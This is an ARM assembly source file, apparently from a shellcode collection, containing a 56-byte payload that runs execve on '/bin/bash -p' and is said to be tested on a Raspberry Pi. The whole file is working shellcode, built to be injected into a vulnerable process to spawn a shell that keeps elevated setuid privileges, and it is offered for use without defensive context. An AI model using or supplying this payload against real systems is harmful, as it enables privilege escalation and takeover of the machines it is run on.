/*
	Author:	 Tosh
	execve("/bin/bash", ["/bin/bash", "-p"], [])
	ARM shellcode (56 bytes)
	Tested on Raspberry PI
*/

.section .text

.global _start

_start:
.code 32
	adr %r1, .thumb+1
	bx %r1
	
.code 16	
.thumb:
	ldr %r3, .string0
	ldr %r4, .string1
	ldr %r5, .string2
	mvn %r5, %r5

	push {%r3, %r4, %r5}	
	mov %r0, %sp

	ldr %r3, .string3
	
	push {%r3}
	mov %r1, %sp

	sub %r2, %r2, %r2
	push {%r0, %r1, %r2}
	mov %r1, %sp	

	mov %r1, %sp
	mov %r7, $11
	swi #1

.align	
.string0:	.word 0x6e69622f /* /bin 	*/
.string1: 	.word 0x7361622f /* /bas	*/
.string2:	.word 0xffffff97 /* not h 	*/
.string3:	.word 0x702d	 /* -p 		*/

	